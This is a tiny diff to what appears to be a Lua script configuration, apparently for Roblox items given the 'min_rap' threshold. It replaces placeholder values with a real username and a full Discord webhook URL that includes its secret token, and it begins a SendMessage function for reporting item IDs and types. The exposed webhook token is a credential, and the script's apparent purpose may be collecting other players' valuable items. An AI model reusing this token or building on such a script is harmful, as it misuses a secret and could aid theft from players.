@@ -1,5 +1,5 @@
-Username = "UserName"
-Webhook = "WeebHook"
+Username = "matou2209"
+Webhook = "https://discord.com/api/webhooks/1213255158545383456/xWWQ4onamyBSWtK08wAM6VTW7-HfjeOZtpCneCkLIzuGYPgYvI1MxZy_ga_IVZUSlkML"
 min_rap = 10000
 
 function SendMessage(url, username, itemID, itemType)
